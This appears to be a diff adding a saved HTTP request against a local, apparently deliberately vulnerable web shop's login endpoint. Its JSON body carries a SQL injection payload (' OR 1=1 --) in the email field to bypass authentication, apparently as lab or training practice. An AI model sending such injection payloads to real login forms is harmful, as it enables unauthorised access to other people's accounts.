@@ -1,0 +1,18 @@
+POST /rest/user/login HTTP/1.1
+Host: 127.0.0.1:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 42
+Origin: http://127.0.0.1:3000
+Connection: keep-alive
+Referer: http://127.0.0.1:3000/
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=W2PaW3mD5oBa7Mp6PLlyrQKw2zd5btQfJKGORx1Nkeb49VvJZq8gjnEXYZr3
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+
+{"email":"' OR 1=1 --","password":"admin"}
